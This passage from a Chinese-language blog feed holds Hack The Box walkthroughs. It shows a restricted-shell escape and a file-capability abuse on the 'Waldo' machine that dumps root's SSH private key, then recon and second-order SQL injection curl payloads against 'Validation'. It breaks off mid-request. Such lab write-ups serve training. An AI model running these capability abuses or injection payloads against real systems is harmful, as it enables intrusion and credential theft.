&lt;http://wiki.alpinelinux.org&gt;.<br>waldo:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>waldo:~$ <span class="hljs-built_in">cat</span> user.txt <br>32768bc...........................<br>waldo:~$ <br></code></pre></td></tr></table></figure><h4 id="逃逸："><a href="#逃逸：" class="headerlink" title="逃逸："></a>逃逸：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">waldo:~$ netstat -antp<br>netstat: can<span class="hljs-string">&#x27;t scan /proc - are you root?</span><br><span class="hljs-string">Active Internet connections (servers and established)</span><br><span class="hljs-string">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="hljs-string">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="hljs-string">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="hljs-string">tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -</span><br><span class="hljs-string">tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -</span><br><span class="hljs-string">tcp        0      0 10.10.10.87:8888        10.10.16.3:34434        ESTABLISHED -</span><br><span class="hljs-string">tcp        0      0 :::80                   :::*                    LISTEN      -</span><br><span class="hljs-string">tcp        0      0 :::22                   :::*                    LISTEN      -</span><br><span class="hljs-string">tcp        0      0 :::8888                 :::*                    LISTEN      -</span><br><span class="hljs-string">waldo:~$ </span><br></code></pre></td></tr></table></figure><p>还有一个8888端口与 9000端口，但如果我用秘钥去重用我会得到一个新用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">waldo:~$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost<br>Linux waldo 4.9.0-6-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.88-1 (2018-04-29) x86_64</span><br>           &amp;.                                                                  <br>          @@@,@@/ %                                                            <br>       <span class="hljs-comment">#*/%@@@@/.&amp;@@,                                                          </span><br>   @@@<span class="hljs-comment">#@@#&amp;@#&amp;#&amp;@@@,*%/                                                        </span><br>   /@@@&amp;<span class="hljs-comment">###########@@&amp;*(*                                                      </span><br> (@<span class="hljs-comment">################%@@@@@.     /**                                             </span><br> @@@@&amp;<span class="hljs-comment">#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                               </span><br> %@@@@%<span class="hljs-comment">##########&amp;@@@....                 .#%#@@@@@@@#                         </span><br> @@&amp;%<span class="hljs-comment">#########@@@@/                        */@@@%(((@@@%                       </span><br>    @@@<span class="hljs-comment">#%@@%@@@,                       *&amp;@@@&amp;%(((#((((@@(                      </span><br>     /(@@@@@@@                     *&amp;@@@@%((((((((((((#@@(                     <br>       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&amp;#,            <br>          %@*(@#%@.,       /@@@@&amp;(((((((((((((((&amp;@@@@@@&amp;#######%%@@@@#    &amp;    <br>        *@@@@@#        .&amp;@@@#(((#(#((((((((#%@@@@@%###&amp;@@@@@@@@@&amp;%##&amp;@@@@@@/   <br>       /@@          #@@@&amp;#(((((((((((#((@@@@@%%%%@@@@%#########%&amp;@@@@@@@@&amp;     <br>      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&amp;@@@@@@@&amp;  <br>      %@/ .&amp;%@@%#(((((((((((((((#@@@@@@@&amp;#####%@@@%#############%@@@&amp;%##&amp;@@/   <br>      @@@@@@%(((((((((((##(((@@@@&amp;%####%@@@%#####&amp;@@@@@@@@@@@@@@@&amp;##&amp;@@@@@@@@@/<br>     @@@&amp;(((#((((((((((((#@@@@@&amp;@@@@######@@@###################&amp;@@@&amp;#####%@@* <br>     @@#(((((((((((((#@@@@%&amp;@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@<br>     *@@%((((((((#@@@@@@@%#&amp;@@,,.,,.&amp;@@@#####################%@@@@@@%######&amp;@@.<br>       @@@#(#&amp;@@@@@&amp;##&amp;@@@&amp;#@@/,,,,,,,,@@@&amp;######&amp;@@@@@@@@&amp;&amp;%######%@@@@@@@@@@@<br>        @@@@@@&amp;%&amp;@@@%#&amp;@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&amp;@@%&amp;@@@@@@&amp;%#####%@@@@.<br>          .@@@###&amp;@@@%%@(,,,%@&amp;,.,,,,,,,,,,,,,.*&amp;@@@@&amp;(,*@&amp;#@%%@@@@@@@@@@@@*   <br>            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&amp;@@@@(&amp;@&amp;@&amp;@@@@(           <br>            .@@&amp;##@@,,/@@@@&amp;(.  .&amp;@@@&amp;,,,.&amp;@@/         #@@%@@@@@&amp;@@@/          <br>           *@@@@@&amp;@@.*@@@          %@@@*,&amp;@@            *@@@@@&amp;.#/,@/          <br>          *@@&amp;*#@@@@@@@&amp;     #@(    .@@@@@@&amp;    ,@@@,    @@@@@(,@/@@           <br>          *@@/@#.#@@@@@/    %@@@,   .@@&amp;%@@@     &amp;@&amp;     @@*@@*(@@#            <br>           (@@/@,,@@&amp;@@@            &amp;@@,,(@@&amp;          .@@%/@@,@@              <br>             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#              <br>               %@@.%@&amp;,(@@@@,  /&amp;@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,              <br>                ,@@,&amp;@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&amp;@               <br>                 &amp;@,*@@.,,,,,..,,,,&amp;@@%/**/@@*,,,,,&amp;(.,,,.@@,,@@               <br>                 /@%,&amp;@/,,,,/@%,,,,,*&amp;@@@@@#.,,,,,.@@@(,,(@@@@@(               <br>                  @@*,@@,,,#@@@&amp;*..,,,,,,,,,,,,/@@@@,*(,,&amp;@/#*                 <br>                  *@@@@@(,,@*,%@@@@@@@&amp;&amp;#%@@@@@@@/,,,,,,,@@                    <br>                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&amp;@,                    <br>                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     <br>                        &amp;@&amp;,,,,,,,,,,,,,,,,,,,,,,,,,,,,&amp;@#                     <br>                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      <br>                         ,@@,,,,,,,,@@@&amp;&amp;&amp;%&amp;@,,,,,..,,@@,                      <br>                          *@@,,,,,,,.,****,..,,,,,,,,&amp;@@                       <br>                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@                        <br>                           .@@,,,,,,,,,,,,,...,,,,,,@@                         <br>                            ,@@@,,,,,,,,,,,,,,,,.(@@@                          <br>                              %@@@@&amp;(,,,,*(#&amp;@@@@@@,     <br>                              <br>                            Here&#x27;s Waldo, where&#x27;s root?<br>Last login: Tue Jul <span class="hljs-number">24</span> <span class="hljs-number">08</span>:<span class="hljs-number">09</span>:<span class="hljs-number">03</span> <span class="hljs-number">2018</span> from <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>-rbash: alias: command not found<br>monitor@waldo:~$ <br></code></pre></td></tr></table></figure><p>是一个受限的shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">monitor@waldo:~$ <span class="hljs-built_in">ls</span><br>app-dev  bin<br>monitor@waldo:~$ <span class="hljs-built_in">cd</span> app-rbash: /dev/null: restricted: cannot redirect output<br>bash: _upvars: `-a2<span class="hljs-string">&#x27;: invalid number specifier</span><br><span class="hljs-string">-rbash: /dev/null: restricted: cannot redirect output</span><br><span class="hljs-string">bash: _upvars: `-a0&#x27;</span>: invalid number specifier<br><br>-rbash: <span class="hljs-built_in">cd</span>: restricted<br>monitor@waldo:~$ <span class="hljs-built_in">id</span><br>bash: <span class="hljs-built_in">id</span>: <span class="hljs-built_in">command</span> not found<br>monitor@waldo:~$ <span class="hljs-built_in">export</span> PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>monitor@waldo:~$ <span class="hljs-built_in">id</span><br>uid=1001(monitor) gid=1001(monitor) <span class="hljs-built_in">groups</span>=1001(monitor)<br>monitor@waldo:~$ <span class="hljs-built_in">ls</span><br>app-dev  bin<br>monitor@waldo:~$ <span class="hljs-built_in">cd</span> app-dev/<br>monitor@waldo:~/app-dev$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">monitor@waldo:~/app-dev$ find / -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">getcap</span> &#123;&#125; \; 2&gt;/dev/null<br>/usr/bin/tac = cap_dac_read_search+ei<br>/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei<br>monitor@waldo:~/app-dev$ <span class="hljs-built_in">tac</span> /root/.ssh/id_rsa<br>-----END RSA PRIVATE KEY-----<br>x8YIcMgR7/X4fGSV20lsgTVMSH9uNNXD+W3sCJ6Nk+mUBcdUoeFt+w==<br>F8mp0GWsEg8kUboEKkyAffG5mcZ/xwZP0MbnmGjIg28DgcbnMsldxOJi3m3VAbC+<br>+hhZnQKBgQClMZWr2GmGv7KN/LfhOa0dil3fWtxSdHdwdLlgrKDJslcQUM03sACh<br>OY5EFZ4ajvkHrYFzoR5dfs+rM2IVhVVhyQLYI60MjcYqMrOhXzBCFFDwa9Kq7jOC<br>q2jYkBe3PeJtebVsevRzkzYewYJPZTHOJCi6ncOY8SzvSK5PfctPSSwz+PXQ0V22<br>9Eq4hFE26P45UMOIT2Nm/QKBgQCPrWUEpblMs/AAPvCC7THfKKWghbczazUchNX4<br>2epEAHBHsz5v6hzfv9XabMm9LTjkW9KL2R7FQN5WkpNUwjgeh5KFYD9GSIFk3W6F<br>CPBz5SAIpg7fe6EtlRwZ+Z5LwXckBdCl/46dliRfWf/ouyrGwI6U8N6oUH+IBIwH<br>uOV/JA5w4urzbUPRNqagREzeqTZN04aM2Jz9kicCgYBZPoVQJWQU6ePoShCBAIva<br>kDE9rs5RkhoMhWcV9R1lV1xXScHaJik0ljghKrnU3yRNPOXTcKCCnxGhXsx8GjWu<br>05yq1Q/+t2tC5y3M+DVo4/cz65dppQcOf0MIIanwV7ncgk2Wa5Mw8fdo1FtnCdlR<br>DgNeNaceHtVrn5Hc9KTUJE7HhBwSffKMM95D/7xzYYxTqM11yh7c/ncCgYEAyDMO<br>eHyHW9Md2J4hDTQbrFDQ7yUDoK+j6fi6V/fndD4IE9NUc1pNhhCB1Nt9nwj28nS7<br>DRTS2YUCgYEA8YGaIIs9L6b2JmnXe8BKBZb0O61r3EsWvkGAsyzxbIlWNSWOcdW5<br>sdQ5XKj5AIIW2XEd+S0Ro1IebfU3S0Bl4pCRzrROxJLNQNOedOv57JoEtcVC0Ko4<br>fz38bJCkN1RWWVgOiKYJUCZQRJ3eNiPBRChp0+NSY3Z/E4omNc07/xpdOnUyPMSP<br>EznnC430sS6DXnGT0r/9MV5VXNomJwyPBz0t8yqvS8uJkni0GZE3hGRrd5fFeEgz<br>hR4MLrQZLcdZJgbnxO9JVJalBYEPmHUS6A5sdTnNGhbJjbbONRgXImb55wTAzqCl<br>WbzU+a+G+YQlX5hRwq39wLL3bTkOHWHVz8AU1laxxBK+WAd+bi/3ZHl56Mjj7tcO<br>ZXGiiZmiigagRDWCiiT/Jv0l+nek8ytEvGWiIQIDAQABAoIBAFQbAoFHe/fdVImb<br>TH9Vx2Otr6alb5C5Ufr3vrmdg5wat9FJYMKnd2hz1ful9GNpOF8cWUIDZYzAHmCO<br>GymtVldQkpmMgE8h1/ymWTIXeMuPp/4k/Gfa0jB0TKplZFpGHZ0mBqsEFAU55t7E<br>IvNf4ow46MvAdiK3nEBD6TJJpwBjqI/RiVb7xac9uA9XWPAZk5CKw1VDCYzhWdbW<br>Hql4uEZ6XmLqaV5sfbGaYShuRDJqverunF/c6ntu7AADFozRfkmXxnjkU4P7g8nE<br>MIIEpAIBAAKCAQEAvN1rN9lPfdclMO+ZnoA17rDK5coWWPBMfIadj/PKozv1Ol49<br>-----BEGIN RSA PRIVATE KEY-----<br>monitor@waldo:~/app-dev$ <span class="hljs-built_in">tac</span> /root/root.txt<br>8fb67............................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Validation</title>
    <link href="/post/HackTheBox-Validation.html"/>
    <url>/post/HackTheBox-Validation.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 01:08:15 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 4566/tcp on 10.10.11.116                                  <br>Discovered open port 80/tcp on 10.10.11.116                                    <br>Discovered open port 22/tcp on 10.10.11.116                                    <br>Discovered open port 8080/tcp on 10.10.11.116 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.116<br>Host is up (0.23s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)<br>|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)<br>|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.48 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="hljs-string">4566/tcp open  http    nginx</span><br><span class="hljs-string">|_http-title: 403 Forbidden</span><br><span class="hljs-string">8080/tcp open  http    nginx</span><br><span class="hljs-string">|_http-title: 502 Bad Gateway</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 23.32 seconds</span><br></code></pre></td></tr></table></figure><p>一个注册页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517091418820.png" alt="image-20220517091418820"  /><p>添加之后会回显在页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092003010.png" alt="image-20220517092003010"  /><p>如果在同一个地点添加不一样的用户名也会回显：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092119745.png" alt="image-20220517092119745"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://validation.htb/ -e php<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940<br>[09:18:48] 403 -  279B  - /.htpasswds<br>[09:18:48] 403 -  279B  - /.httr-oauth<br>[09:18:49] 403 -  279B  - /.htpasswd_test<br>[09:19:01] 200 -   16B  - /account.php<br>[09:19:14] 200 -    0B  - /config.php<br>[09:19:17] 301 -  314B  - /css  -&gt;  http://validation.htb/css/<br>[09:19:25] 200 -   16KB - /index.php<br>[09:19:25] 200 -   16KB - /index.php/login/<br>[09:19:26] 403 -  279B  - /js/<br>[09:19:26] 301 -  313B  - /js  -&gt;  http://validation.htb/js/<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092247200.png" alt="image-20220517092247200"  /><p>config读取不出来，login与index一样，只是没有了渲染。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>validation.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>29<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://validation.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://validation.htb/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>user=ca28b722bc10aa4b3beb941d5ca220ca<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-ini"><span class="hljs-attr">username</span>=admin&amp;country=Brazil</span><br></code></pre></td></tr></table></figure><h4 id="SQLi："><a href="#SQLi：" class="headerlink" title="SQLi："></a>SQLi：</h4><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517092643337.png" alt="image-20220517092643337"/><p>无论如何更改参数服务器都会响应一个set cookie，如果在Country后边添加一个单引号，服务器一样会返回一个cookie，但是如果用它返回的cookie当作用户名，服务端会返回一些报错信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-white&quot;</span>&gt;</span>Welcome 21232f297a57a5a743894a0e4a801fc3&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-white&quot;</span>&gt;</span>Other Players In Brazil&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Fatal error<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33<br>Stack trace:<br>#0 &#123;main&#125;<br>  thrown in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/account.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>33<br></code></pre></td></tr></table></figure><p>为验证这个猜想，我在单引号后边又添加了注释：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http">&gt;&gt; curl -v -d &quot;username=hack&amp;country=Brazil&#x27;-- -&quot; http://validation.htb            <br>*   Trying 10.10.11.116:80...<br>* Connected to validation.htb (10.10.11.116) port 80 (#0)<br>&gt; POST / HTTP/1.1<br>&gt; Host: validation.htb<br>&gt; User-Agent: curl/7.83.0<br>&gt; Accept: */*<br>&gt; Content-Length: 32<br>&gt; Content-Type: application/x-www-form-urlencoded<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 302 Found<br>&lt; Date: Tue, 17 May 2022 01:49:16 GMT<br>&lt; Server: Apache/2.4.48 (Debian)<br>&lt; X-Powered-By: PHP/7.4.23<br>&lt; Set-Cookie: user=d78b6f30225cdc811adfe8d4e7c9fd34<br>&lt; Location: /account.php<br>&lt; Content-Length: 0<br>&lt; Content-Type: text/html; charset=UTF-8<br>&lt; <br>* Connection #0 to host validation.htb left intact<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http">&gt;&gt; curl -v --cookie &quot;user=d78b6f30225cdc811adfe8d4e7c9fd34&quot; http://validation.htb/account.php<br>*   Trying 10.10.11.116:80...<br>* Connected to validation.htb (10.10.11.116) port 80 (#0)<br>&gt; GET /account.php HTTP/1.1<br>&gt; Host: validation.htb<br>&gt; User-Agent: curl/7.83.0<br>&gt; Accept: */*<br>&gt; Cookie: user=d78b6f30225cdc811adfe8d4e7c9fd34<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 200 OK<br>&lt; Date: Tue, 17 May 2022 01:50:54 GMT<br>&lt; Server: Apache/2.4.48 (Debian)<br>&lt; X-Powered-By: PHP/7.4.23<br>&lt; Vary: Accept-Encoding<br>&lt; Content-Length: 762<br>&lt; Content-Type: text/html; charset=UTF-8<br>&lt; <br>&lt;link href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;<br>&lt;script src=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;<br>&lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;<br>&lt;!------ Include the above in your HEAD tag ----------&gt;<br><br>&lt;div class=&quot;container&quot;&gt;<br>&lt;h1 class=&quot;text-center m-5&quot;&gt;Join the UHC - September Qualifiers&lt;/h1&gt;<br><br>&lt;/div&gt;<br>&lt;section class=&quot;bg-dark text-center p-5 mt-4&quot;&gt;<br>&lt;div class=&quot;container p-5&quot;&gt;<br>            &lt;h1 class=&quot;text-white&quot;&gt;Welcome hack&lt;/h1&gt;&lt;h3 class=&quot;text-white&quot;&gt;Other Players In Brazil&#x27;-- &lt;/h3&gt;&lt;li class=&#x27;text-white&#x27;&gt;mosaic&lt;/li&gt;&lt;li class=&#x27;text-white&#x27;&gt;mosaicd&lt;/li&gt;&lt;li class=&#x27;text-white&#x27;&gt;admin&lt;/li&gt;&lt;/div&gt;<br>&lt;/section&gt;<br>&lt;/div&gt;<br>* Connection #0 to host validation.htb left intact<br></code></pre></td></tr></table></figure><p>这次并没有报错，这似乎是一个二次注入：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http">&gt;&gt; curl -v -d &quot;username=hack&amp;country=Brazil&#x27;union select 1--+&quot; http://validation.htb<br>*   Trying 10.10.11.116:80...<br>* Connected to validation.htb (10.10.11.116) port 80 (#0)<br>&gt; POST / HTTP/1.1<br>&gt; Host: validation.htb<br>&gt; User-Agent: curl/7.83.0<br>&gt; Accept: */*<br>&gt; Content-Length: 